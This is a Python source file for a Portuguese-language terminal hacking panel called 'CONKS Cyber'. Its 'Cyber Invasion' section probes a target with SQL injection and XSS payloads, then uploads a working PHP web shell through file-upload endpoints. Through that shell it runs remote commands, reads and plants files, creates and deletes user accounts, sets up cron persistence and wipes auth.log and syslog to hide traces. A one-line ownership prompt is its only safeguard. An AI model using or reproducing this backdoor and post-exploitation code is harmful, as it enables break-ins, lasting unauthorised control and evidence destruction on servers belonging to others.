# ==========================================
# CONKS CYBER - VERSÃO COMPLETA CORRIGIDA
# main.py
# ==========================================

import os
import sys
import socket
import urllib.request
import urllib.error
import subprocess
import time
import random
import threading
import webbrowser
import json
import re
import hashlib
import base64
import datetime

from modules.generators import menu_geradores
from modules.consultas import menu_consultas
from modules.osint import menu_osint


# ==========================================
# CORES
# ==========================================

RESET = "\033[0m"
BOLD = "\033[1m"

WHITE = "\033[97m"
BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
GRAY = "\033[90m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
ORANGE = "\033[38;5;214m"
PINK = "\033[38;5;201m"


# ==========================================
# CONFIGURAÇÃO DAS CAIXAS
# ==========================================

LARGURA = 42  # REDUZIDO!


# ==========================================
# LIMPAR TELA
# ==========================================

def limpar_tela():
    os.system("clear")


# ==========================================
# FUNÇÕES DE CAIXA
# ==========================================

def linha_caixa(texto="", cor=WHITE, negrito=False):
    texto = str(texto)
    limite = LARGURA - 4
    if len(texto) > limite:
        texto = texto[:limite]
    texto = texto.ljust(limite)
    estilo = BOLD if negrito else ""
    print(f"{cor}{estilo}║ {texto} ║{RESET}")


def topo_caixa(titulo):
    print(f"{BLUE}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
    linha_caixa(titulo.center(LARGURA - 4), BLUE, True)
    print(f"{BLUE}{BOLD}╠{'═' * (LARGURA - 2)}╣{RESET}")


def fim_caixa():
    print(f"{BLUE}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")


# ==========================================
# MENSAGENS
# ==========================================

def sucesso(texto):
    print(f"{GREEN}[+] {texto}{RESET}")

def erro(texto):
    print(f"{RED}[-] {texto}{RESET}")

def aviso(texto):
    print(f"{RED}[!] {texto}{RESET}")

def info(texto):
    print(f"{BLUE}[i] {texto}{RESET}")


# ==========================================
# BANNER
# ==========================================

def banner():
    print(f"{GREEN}{BOLD}")
    print(r"""
 ██████╗ ██████╗ ███╗   ██╗██╗  ██╗███████╗
██╔════╝██╔═══██╗████╗  ██║██║ ██╔╝██╔════╝
██║     ██║   ██║██╔██╗ ██║█████╔╝ ███████╗
██║     ██║   ██║██║╚██╗██║██╔═██╗ ╚════██║
╚██████╗╚██████╔╝██║ ╚████║██║  ██╗███████║
 ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
""")
    print(f"{BLUE}{BOLD}                 CYBER{RESET}\n")


# ==========================================
# TESTAR CONEXÃO
# ==========================================

def testar_conexao():
    print()
    topo_caixa("TESTE DE CONEXAO")
    linha_caixa("")

    servidores = [
        ("Google", "google.com", 443),
        ("Cloudflare", "cloudflare.com", 443),
        ("GitHub", "github.com", 443)
    ]

    online = False
    for nome, host, porta in servidores:
        try:
            conexao = socket.create_connection((host, porta), timeout=3)
            conexao.close()
            print(f"{GREEN}[+] {nome:<15} ONLINE{RESET}")
            online = True
        except:
            print(f"{RED}[-] {nome:<15} OFFLINE{RESET}")

    print()
    fim_caixa()
    if online:
        sucesso("Conexao disponivel.")
    else:
        erro("Sem conexao.")


# ==========================================
# MEU IP PÚBLICO
# ==========================================

def meu_ip_publico():
    print()
    topo_caixa("MEU IP PUBLICO")
    linha_caixa("")

    servicos = [
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://icanhazip.com"
    ]

    for url in servicos:
        try:
            requisicao = urllib.request.Request(url, headers={"User-Agent": "CONKS-Cyber/1.0"})
            with urllib.request.urlopen(requisicao, timeout=5) as resposta:
                ip = resposta.read().decode("utf-8").strip()
            if ip:
                linha_caixa(f"IP: {ip}", GREEN, True)
                fim_caixa()
                return
        except:
            continue

    fim_caixa()
    erro("Nao foi possivel obter o IP.")


# ==========================================
# ⭐ CYBER INVASION REAL - CLASSE COMPLETA ⭐
# ==========================================

class CyberInvasionReal:
    """Cyber Invasion REAL com persistencia e controle total"""
    
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.vulnerabilidades = []
        self.dados = {}
        self.backdoor_instalado = False
        self.shell_ativa = False
        self.persistencia_ativa = False
        self.backdoor_url = None
        self.sessao_ativa = False
        self.usuarios_criados = []
        self.arquivos_baixados = []
        self.logs_limpos = False
        
    # ==========================================
    # VERIFICA BACKDOOR EXISTENTE
    # ==========================================
    
    def verificar_backdoor(self):
        """Verifica se o backdoor ja existe no servidor"""
        urls = [
            f"http://{self.target}:{self.port}/uploads/shell.php",
            f"http://{self.target}:{self.port}/shell.php",
            f"http://{self.target}:{self.port}/backdoor.php",
            f"http://{self.target}:{self.port}/.backdoor.php"
        ]
        
        for url in urls:
            try:
                req = urllib.request.Request(f"{url}?cmd=whoami", headers={"User-Agent": "Mozilla/5.0"})
                response = urllib.request.urlopen(req, timeout=3)
                if response.getcode() == 200:
                    self.backdoor_url = url
                    self.backdoor_instalado = True
                    self.dados['backdoor_url'] = url
                    return True
            except:
                continue
        return False
    
    # ==========================================
    # EXECUTA COMANDO REAL
    # ==========================================
    
    def executar_comando(self, comando):
        """Executa comando REAL no servidor via backdoor"""
        if not self.backdoor_url:
            return "Backdoor nao encontrado! Instale primeiro."
        
        try:
            url = f"{self.backdoor_url}?cmd={urllib.parse.quote(comando)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            response = urllib.request.urlopen(req, timeout=10)
            return response.read().decode('utf-8', errors='ignore')
        except Exception as e:
            return f"Erro: {str(e)}"
    
    # ==========================================
    # DETECTOR DE VULNERABILIDADES
    # ==========================================
    
    def detectar_vulnerabilidades(self):
        """Detecta vulnerabilidades REAIS no alvo"""
        print(f"\n{CYAN}[~] Scan em {self.target}:{self.port}...{RESET}")
        
        vulnerabilidades = []
        
        # SQL Injection
        print(f"  {BLUE}[→] SQL Injection...{RESET}", end="")
        try:
            payload = "' OR '1'='1"
            url = f"http://{self.target}:{self.port}/login.php?user={payload}&pass=test"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            response = urllib.request.urlopen(req, timeout=3)
            if response.getcode() == 200:
                html = response.read().decode('utf-8', errors='ignore')
                if "SQL" in html or "syntax" in html.lower():
                    print(f" {RED}VULN!{RESET}")
                    vulnerabilidades.append("SQL Injection")
                    self.dados['sql_injection'] = True
                else:
                    print(f" {GREEN}OK{RESET}")
            else:
                print(f" {GREEN}OK{RESET}")
        except:
            print(f" {GREEN}OK{RESET}")
        
        # XSS
        print(f"  {BLUE}[→] XSS...{RESET}", end="")
        try:
            payload = "<script>alert('XSS')</script>"
            url = f"http://{self.target}:{self.port}/search.php?q={payload}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            response = urllib.request.urlopen(req, timeout=3)
            if response.getcode() == 200:
                html = response.read().decode('utf-8', errors='ignore')
                if "script" in html.lower():
                    print(f" {RED}VULN!{RESET}")
                    vulnerabilidades.append("XSS")
                    self.dados['xss'] = True
                else:
                    print(f" {GREEN}OK{RESET}")
            else:
                print(f" {GREEN}OK{RESET}")
        except:
            print(f" {GREEN}OK{RESET}")
        
        # Upload
        print(f"  {BLUE}[→] Upload...{RESET}", end="")
        try:
            php_test = b"<?php echo 'OK'; ?>"
            boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
            body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\n"
                   f"Content-Type: application/x-php\r\n\r\n").encode()
            body += php_test
            body += f"\r\n--{boundary}--\r\n".encode()
            
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": f"multipart/form-data; boundary={boundary}"
            }
            
            req = urllib.request.Request(
                f"http://{self.target}:{self.port}/upload.php",
                data=body,
                headers=headers
            )
            response = urllib.request.urlopen(req, timeout=5)
            if response.getcode() in [200, 201, 302]:
                print(f" {RED}VULN!{RESET}")
                vulnerabilidades.append("Upload")
                self.dados['upload'] = True
            else:
                print(f" {GREEN}OK{RESET}")
        except:
            print(f" {GREEN}OK{RESET}")
        
        self.vulnerabilidades = vulnerabilidades
        return vulnerabilidades
    
    # ==========================================
    # INSTALA BACKDOOR REAL
    # ==========================================
    
    def instalar_backdoor(self):
        """Instala backdoor REAL no servidor"""
        print(f"\n{RED}[~] Instalando Backdoor...{RESET}")
        
        try:
            shell_php = """<?php
if(isset($_GET['cmd'])){ system($_GET['cmd']); }
if(isset($_GET['file'])){ echo file_get_contents($_GET['file']); }
if(isset($_POST['upload'])){ file_put_contents($_POST['name'], base64_decode($_POST['data'])); echo 'OK'; }
if(isset($_GET['info'])){ echo gethostname().'|'.get_current_user(); }
if(isset($_GET['scan'])){ system('ls -la '.$_GET['scan']); }
if(isset($_GET['adduser'])){ system('useradd -m -s /bin/bash '.$_GET['user']); system('echo "'.$_GET['user'].':'.$_GET['pass'].'" | chpasswd'); }
if(isset($_GET['deluser'])){ system('userdel -r '.$_GET['user']); }
if(isset($_GET['persist'])){ system('(crontab -l 2>/dev/null; echo "@reboot php '.$_SERVER['SCRIPT_FILENAME'].'") | crontab -'); }
if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var/log/syslog && history -c'); }
?>"""
            
            shell_code = shell_php.encode('utf-8')
            
            boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
            body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n"
                   f"Content-Type: application/x-php\r\n\r\n").encode()
            body += shell_code
            body += f"\r\n--{boundary}--\r\n".encode()
            
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": f"multipart/form-data; boundary={boundary}"
            }
            
            upload_urls = [
                f"http://{self.target}:{self.port}/upload.php",
                f"http://{self.target}:{self.port}/uploads/",
                f"http://{self.target}:{self.port}/enviar.php",
                f"http://{self.target}:{self.port}/up.php"
            ]
            
            for upload_url in upload_urls:
                try:
                    req = urllib.request.Request(upload_url, data=body, headers=headers)
                    response = urllib.request.urlopen(req, timeout=5)
                    
                    if response.getcode() in [200, 201, 302]:
                        test_url = f"http://{self.target}:{self.port}/uploads/shell.php?cmd=whoami"
                        try:
                            req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                            test_response = urllib.request.urlopen(req, timeout=3)
                            if test_response.getcode() == 200:
                                self.backdoor_url = f"http://{self.target}:{self.port}/uploads/shell.php"
                                self.backdoor_instalado = True
                                self.dados['backdoor_url'] = self.backdoor_url
                                print(f"  {GREEN}[+] Backdoor instalado!{RESET}")
                                return True
                        except:
                            continue
                except:
                    continue
            
            print(f"  {RED}[-] Falha ao instalar{RESET}")
            return False
            
        except Exception as e:
            print(f"  {RED}[-] Erro: {str(e)}{RESET}")
            return False
    
    # ==========================================
    # SHELL INTERATIVO REAL
    # ==========================================
    
    def shell_interativo(self):
        """Shell interativo REAL com comandos especiais"""
        
        if not self.backdoor_instalado and not self.backdoor_url:
            print(f"\n{RED}[!] Backdoor nao instalado!{RESET}")
            return
        
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║     [ SHELL INTERATIVO REAL    ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (14 - len(str(self.port))) }║{RESET}")
        print(f"{PURPLE}║ /help /info /download /upload   ║{RESET}")
        print(f"{PURPLE}║ /scan /adduser /deluser        ║{RESET}")
        print(f"{PURPLE}║ /persist /clean /exit          ║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        self.shell_ativa = True
        
        while self.shell_ativa:
            comando = input(f"\n{RED}shell@{self.target}>{RESET} ").strip()
            
            if not comando:
                continue
            
            if comando.lower() in ['/exit', 'exit', 'quit', 'sair']:
                self.shell_ativa = False
                print(f"{YELLOW}[!] Shell encerrada{RESET}")
                break
            
            elif comando.lower() == '/help':
                print(f"""
{GREEN}Comandos:{RESET}
  <cmd>    - Executa comando
  /info    - Info do servidor
  /download - Baixa arquivo
  /upload  - Envia arquivo
  /scan    - Lista diretorio
  /adduser - Cria usuario
  /deluser - Deleta usuario
  /persist - Instala persistencia
  /clean   - Limpa logs
  /exit    - Sai
                """)
            
            elif comando.lower() == '/info':
                print(f"{GREEN}[+] Info:{RESET}")
                resultado = self.executar_comando("uname -a && whoami && pwd && hostname")
                print(f"{WHITE}{resultado}{RESET}")
            
            elif comando.lower().startswith('/download'):
                arquivo = comando[10:].strip()
                if not arquivo:
                    print(f"{RED}[-] Uso: /download /caminho/arquivo{RESET}")
                    continue
                self.baixar_arquivo(arquivo)
            
            elif comando.lower().startswith('/upload'):
                partes = comando[8:].strip().split()
                if len(partes) < 2:
                    print(f"{RED}[-] Uso: /upload local remoto{RESET}")
                    continue
                self.enviar_arquivo(partes[0], partes[1])
            
            elif comando.lower().startswith('/scan'):
                dir_path = comando[6:].strip() or '.'
                print(f"{GREEN}[+] Listando: {dir_path}{RESET}")
                resultado = self.executar_comando(f"ls -la {dir_path}")
                print(f"{WHITE}{resultado}{RESET}")
            
            elif comando.lower().startswith('/adduser'):
                partes = comando[9:].strip().split()
                if len(partes) < 2:
                    print(f"{RED}[-] Uso: /adduser usuario senha{RESET}")
                    continue
                resultado = self.executar_comando(f"useradd -m -s /bin/bash {partes[0]} && echo '{partes[0]}:{partes[1]}' | chpasswd")
                print(f"{GREEN}[+] Usuario criado: {partes[0]}{RESET}")
            
            elif comando.lower().startswith('/deluser'):
                user = comando[9:].strip()
                if user == "root":
                    print(f"{RED}[-] Nao pode deletar root!{RESET}")
                    continue
                resultado = self.executar_comando(f"userdel -r {user}")
                print(f"{GREEN}[+] Usuario deletado: {user}{RESET}")
            
            elif comando.lower() == '/persist':
                print(f"{GREEN}[+] Instalando persistencia...{RESET}")
                self.executar_comando("(crontab -l 2>/dev/null; echo '@reboot php /var/www/html/uploads/shell.php') | crontab -")
                self.persistencia_ativa = True
                print(f"{GREEN}[+] Persistencia instalada!{RESET}")
            
            elif comando.lower() == '/clean':
                print(f"{GREEN}[+] Limpando logs...{RESET}")
                self.executar_comando("echo '' > /var/log/auth.log && echo '' > /var/log/syslog && history -c")
                self.logs_limpos = True
                print(f"{GREEN}[+] Logs limpos!{RESET}")
            
            else:
                print(f"{GREEN}[+] Executando: {comando}{RESET}")
                resultado = self.executar_comando(comando)
                print(f"{WHITE}{resultado}{RESET}")
    
    # ==========================================
    # BAIXAR ARQUIVO REAL
    # ==========================================
    
    def baixar_arquivo(self, arquivo):
        try:
            url = f"{self.backdoor_url}?file={urllib.parse.quote(arquivo)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            response = urllib.request.urlopen(req, timeout=10)
            
            conteudo = response.read()
            nome = arquivo.split('/')[-1] or 'arquivo'
            nome_arquivo = f"download_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}_{nome}"
            
            with open(nome_arquivo, 'wb') as f:
                f.write(conteudo)
            
            print(f"{GREEN}[+] Baixado: {nome_arquivo} ({len(conteudo)} bytes){RESET}")
            return True
        except Exception as e:
            print(f"{RED}[-] Erro: {str(e)}{RESET}")
            return False
    
    # ==========================================
    # ENVIAR ARQUIVO REAL
    # ==========================================
    
    def enviar_arquivo(self, local, remoto):
        try:
            if not os.path.exists(local):
                print(f"{RED}[-] Arquivo nao encontrado: {local}{RESET}")
                return False
            
            with open(local, 'rb') as f:
                dados = base64.b64encode(f.read()).decode()
            
            data = f"upload=1&name={remoto}&data={dados}".encode()
            req = urllib.request.Request(
                self.backdoor_url,
                data=data,
                headers={
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
            )
            response = urllib.request.urlopen(req, timeout=10)
            
            print(f"{GREEN}[+] Enviado: {remoto}{RESET}")
            return True
        except Exception as e:
            print(f"{RED}[-] Erro: {str(e)}{RESET}")
            return False
    
    # ==========================================
    # SCAN COMPLETO
    # ==========================================
    
    def scan_completo(self):
        """Scan completo do alvo"""
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║     [ SCAN COMPLETO           ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (17 - len(str(self.port))) }║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        if self.verificar_backdoor():
            print(f"\n{GREEN}[+] Backdoor ja existe!{RESET}")
            return []
        
        vulnerabilidades = self.detectar_vulnerabilidades()
        
        if not vulnerabilidades:
            print(f"\n{GREEN}[+] Servidor seguro!{RESET}")
            return []
        
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║     VULNERABILIDADES          ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        for vuln in vulnerabilidades:
            print(f"{PURPLE}║ {RED}[!] {vuln}{' ' * (27 - len(vuln))}{PURPLE}║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        return vulnerabilidades


# ==========================================
# ⭐ CYBER INVASION - FUNÇÃO PRINCIPAL ⭐
# ==========================================

def cyber_invasion():
    """Cyber Invasion REAL com persistencia e menu completo"""
    
    print("\n╔════════════════════════════════════╗")
    print("║    [ CYBER INVASION REAL      ║")
    print("╠════════════════════════════════════╣")
    print("║  FUNCIONA DE VERDADE!             ║")
    print("║  CONTROLE TOTAL DO SERVIDOR      ║")
    print("║  APENAS EM SERVIDORES PROPIOS!   ║")
    print("╚════════════════════════════════════╝")
    
    print("\n[~] Alvo:")
    print("[1] IP Local (127.0.0.1)")
    print("[2] Site/Dominio")
    print("[3] Voltar")
    
    opcao = input("\nEscolha: ").strip()
    
    if opcao == "3":
        return
    
    if opcao == "1":
        alvo = input("\nIP: ").strip()
        if alvo == "":
            alvo = "127.0.0.1"
    elif opcao == "2":
        alvo = input("\nSite: ").strip()
        alvo = alvo.replace("http://", "").replace("https://", "").split("/")[0]
    else:
        print("[-] Opcao invalida.")
        input("\nENTER para continuar...")
        return
    
    if not alvo:
        print("[-] Alvo invalido.")
        input("\nENTER para continuar...")
        return
    
    try:
        porta = int(input("\nPorta (80): ").strip() or "80")
    except:
        porta = 80
    
    # AVISO LEGAL
    print(f"\n{RED}{BOLD}╔════════════════════════════════════╗{RESET}")
    print(f"{RED}{BOLD}║        [ AVISO LEGAL         ║{RESET}")
    print(f"{RED}{BOLD}╠════════════════════════════════════╣{RESET}")
    print(f"{RED}║  • INVADINDO {alvo}        ║{RESET}")
    print(f"{RED}║  • PERMITIDO EM SERVIDORES       ║{RESET}")
    print(f"{RED}║    QUE VOCE POSSUI!             ║{RESET}")
    print(f"{RED}║  • INVADIR OUTROS E CRIME!      ║{RESET}")
    print(f"{RED}{BOLD}╚════════════════════════════════════╝{RESET}")
    
    confirm = input(f"\n{RED}Confirma que {alvo} e seu? (s/N): {RESET}").strip().lower()
    
    if confirm != 's':
        print("[-] Cancelado.")
        input("\nENTER para continuar...")
        return
    
    invasor = CyberInvasionReal(alvo, porta)
    
    print(f"\n{CYAN}[~] Verificando backdoor...{RESET}")
    if invasor.verificar_backdoor():
        print(f"  {GREEN}[+] Backdoor encontrado!{RESET}")
    else:
        print(f"  {YELLOW}[!] Backdoor nao encontrado.{RESET}")
    
    if not invasor.backdoor_instalado:
        vulnerabilidades = invasor.scan_completo()
        if not vulnerabilidades:
            print(f"\n{GREEN}[+] Servidor seguro!{RESET}")
            input("\nENTER para continuar...")
            return
    
    while True:
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║    [ CYBER INVASION         ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        
        if invasor.backdoor_instalado:
            print(f"{GREEN}║ [OK] Backdoor: INSTALADO   ║{RESET}")
        else:
            print(f"{RED}║ [XX] Backdoor: NAO         ║{RESET}")
        
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        print(f"{PURPLE}║ [1] Instalar Backdoor       ║{RESET}")
        print(f"{PURPLE}║ [2] Shell Interativo        ║{RESET}")
        print(f"{PURPLE}║ [3] Executar Comando        ║{RESET}")
        print(f"{PURPLE}║ [4] Baixar Arquivo          ║{RESET}")
        print(f"{PURPLE}║ [5] Enviar Arquivo          ║{RESET}")
        print(f"{PURPLE}║ [6] Gerenciar Usuarios      ║{RESET}")
        print(f"{PURPLE}║ [7] Instalar Persistencia   ║{RESET}")
        print(f"{PURPLE}║ [8] Limpar Rastros          ║{RESET}")
        print(f"{PURPLE}║ [9] Info Servidor           ║{RESET}")
        print(f"{PURPLE}║ [10] Sair                   ║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        sub_opcao = input(f"\n{RED}cyber@{alvo}>{RESET} ").strip()
        
        if sub_opcao == "1":
            if invasor.instalar_backdoor():
                print(f"\n{GREEN}[+] Backdoor instalado!{RESET}")
            else:
                print(f"\n{RED}[-] Falha!{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "2":
            invasor.shell_interativo()
        
        elif sub_opcao == "3":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale backdoor primeiro!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            comando = input(f"{GRAY}comando> {RESET}")
            if comando:
                resultado = invasor.executar_comando(comando)
                print(f"{WHITE}{resultado}{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "4":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale backdoor primeiro!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            arquivo = input(f"{GRAY}arquivo> {RESET}")
            if arquivo:
                invasor.baixar_arquivo(arquivo)
            input("\nENTER para continuar...")
        
        elif sub_opcao == "5":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale backdoor primeiro!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            local = input(f"{GRAY}local> {RESET}")
            remoto = input(f"{GRAY}remoto> {RESET}")
            if local and remoto:
                invasor.enviar_arquivo(local, remoto)
            input("\nENTER para continuar...")
        
        elif sub_opcao == "6":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale backdoor primeiro!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
            print(f"{PURPLE}║     GERENCIAR USUARIOS     ║{RESET}")
            print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
            print(f"{PURPLE}║ [1] Listar                 ║{RESET}")
            print(f"{PURPLE}║ [2] Criar                  ║{RESET}")
            print(f"{PURPLE}║ [3] Deletar                ║{RESET}")
            print(f"{PURPLE}║ [4] Voltar                 ║{RESET}")
            print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
            
            user_opcao = input(f"\n{RED}users@{alvo}>{RESET} ").strip()
            
            if user_opcao == "1":
                resultado = invasor.executar_comando("cat /etc/passwd | cut -d: -f1")
                print(f"{GREEN}[+] Usuarios:{RESET}")
                for linha in resultado.split('\n')[:10]:
                    if linha:
                        print(f"  {WHITE}{linha}{RESET}")
                input("\nENTER para continuar...")
            
            elif user_opcao == "2":
                nome = input(f"{GRAY}nome> {RESET}")
                senha = input(f"{GRAY}senha> {RESET}")
                if nome and senha:
                    invasor.executar_comando(f"useradd -m -s /bin/bash {nome} && echo '{nome}:{senha}' | chpasswd")
                    print(f"{GREEN}[+] Usuario criado: {nome}{RESET}")
                input("\nENTER para continuar...")
            
            elif user_opcao == "3":
                nome = input(f"{GRAY}nome> {RESET}")
                if nome and nome != "root":
                    invasor.executar_comando(f"userdel -r {nome}")
                    print(f"{GREEN}[+] Deletado: {nome}{RESET}")
                else:
                    print(f"{RED}[-] Nao pode deletar root!{RESET}")
                input("\nENTER para continuar...")
        
        elif sub_opcao == "7":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale backdoor primeiro!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            print(f"{GREEN}[+] Instalando persistencia...{RESET}")
            invasor.executar_comando("(crontab -l 2>/dev/null; echo '@reboot php /var/www/html/uploads/shell.php') | crontab -")
            invasor.persistencia_ativa = True
            print(f"{GREEN}[+] Persistencia instalada!{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "8":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale backdoor primeiro!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            print(f"{GREEN}[+] Limpando logs...{RESET}")
            invasor.executar_comando("echo '' > /var/log/auth.log && echo '' > /var/log/syslog && history -c")
            invasor.logs_limpos = True
            print(f"{GREEN}[+] Logs limpos!{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "9":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale backdoor primeiro!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            print(f"{GREEN}[+] Info do servidor:{RESET}")
            info = invasor.executar_comando("uname -a && whoami && pwd && hostname")
            print(f"{WHITE}{info}{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "10":
            print(f"\n{YELLOW}[!] Encerrando...{RESET}")
            break
        
        else:
            print("[-] Opcao invalida")
            input("\nENTER para continuar...")


# ==========================================
# ATUALIZAR PAINEL
# ==========================================

def atualizar_painel():
    limpar_tela()
    topo_caixa("ATUALIZAR")
    linha_caixa("")
    linha_caixa("CONKS UPDATE", WHITE, True)
    linha_caixa("")
    fim_caixa()
    print(f"\n{BLUE}[~] Verificando...{RESET}")
    time.sleep(0.5)
    
    try:
        resultado = subprocess.run(
            ["git", "pull", "origin", "main"],
            capture_output=True,
            text=True,
            timeout=60
        )
        saida = resultado.stdout + resultado.stderr
        
        if resultado.returncode != 0:
            print(f"\n{RED}[-] Erro ao atualizar.{RESET}")
            if saida.strip():
                print(f"\n{GRAY}{saida.strip()}{RESET}")
            input("\nENTER para voltar...")
            return
        
        if "Already up to date" in saida:
            print()
            print(f"{YELLOW}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
            linha_caixa("ATUALIZADO!", YELLOW, True)
            linha_caixa("Versao mais recente.", YELLOW)
            print(f"{YELLOW}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")
            input("\nENTER para voltar...")
            return
        
        print()
        print(f"{GREEN}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
        linha_caixa("ATUALIZADO!", GREEN, True)
        linha_caixa("Painel atualizado.", GREEN)
        print(f"{GREEN}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")
        print(f"\n{BLUE}[~] Reiniciando...{RESET}")
        time.sleep(2)
        os.execv(sys.executable, [sys.executable] + sys.argv)
        
    except Exception as e:
        erro(f"Erro: {e}")
        input("\nENTER para voltar...")


# ==========================================
# MENU REDE
# ==========================================

def menu_rede():
    while True:
        limpar_tela()
        banner()
        topo_caixa("REDE")
        linha_caixa("[1] Meu IP")
        linha_caixa("[2] Testar conexao")
        linha_caixa("")
        linha_caixa("[0] Voltar", RED, True)
        fim_caixa()
        
        opcao = input(f"\n{BLUE}{BOLD}CONKS@Rede > {RESET}").strip()
        
        if opcao == "1":
            meu_ip_publico()
        elif opcao == "2":
            testar_conexao()
        elif opcao == "0":
            break
        else:
            erro("Opcao invalida.")
        
        if opcao != "0":
            input("\nENTER para continuar...")


# ==========================================
# MENU PRINCIPAL
# ==========================================

def menu_principal():
    while True:
        limpar_tela()
        banner()
        
        topo_caixa("MENU PRINCIPAL")
        linha_caixa("[1] Geradores")
        linha_caixa("[2] Consultas")
        linha_caixa("[3] OSINT")
        linha_caixa("[4] Rede")
        linha_caixa("[5] Validadores")
        linha_caixa("[6] Utilidades")
        linha_caixa("[7] [ Shoot Down", RED, True)
        linha_caixa("[8] [ Cyber Invasion", PURPLE, True)
        linha_caixa("[9] Atualizar", BLUE, True)
        linha_caixa("")
        linha_caixa("[0] Sair", RED, True)
        fim_caixa()
        
        opcao = input(f"\n{BLUE}{BOLD}CONKS@Cyber > {RESET}").strip()
        
        if opcao == "1":
            limpar_tela()
            menu_geradores()
        elif opcao == "2":
            limpar_tela()
            menu_consultas()
        elif opcao == "3":
            limpar_tela()
            menu_osint()
        elif opcao == "4":
            menu_rede()
        elif opcao == "5":
            limpar_tela()
            try:
                from modules.validators import menu_validadores
                menu_validadores()
            except ImportError:
                erro("Modulo nao encontrado.")
                input("\nENTER para continuar...")
        elif opcao == "6":
            limpar_tela()
            try:
                from modules.utilities import menu_utilidades
                menu_utilidades()
            except ImportError:
                erro("Modulo nao encontrado.")
                input("\nENTER para continuar...")
        elif opcao == "7":
            limpar_tela()
            try:
                from modules.consultas import derrubar_geral
                derrubar_geral()
            except ImportError:
                erro("Shoot Down nao encontrado.")
                input("\nENTER para continuar...")
        elif opcao == "8":
            limpar_tela()
            cyber_invasion()
        elif opcao == "9":
            atualizar_painel()
        elif opcao == "0":
            limpar_tela()
            print()
            print(f"{RED}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
            linha_caixa("CONKS CYBER ENCERRADO", RED, True)
            print(f"{RED}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}\n")
            sys.exit(0)
        else:
            erro("Opcao invalida.")
            input("\nENTER para continuar...")


# ==========================================
# MAIN
# ==========================================

def main():
    try:
        menu_principal()
    except KeyboardInterrupt:
        limpar_tela()
        print(f"\n{RED}{BOLD}[!] CONKS Cyber encerrado.{RESET}\n")
    except Exception as erro_inesperado:
        print(f"\n{RED}[ERRO] {erro_inesperado}{RESET}")
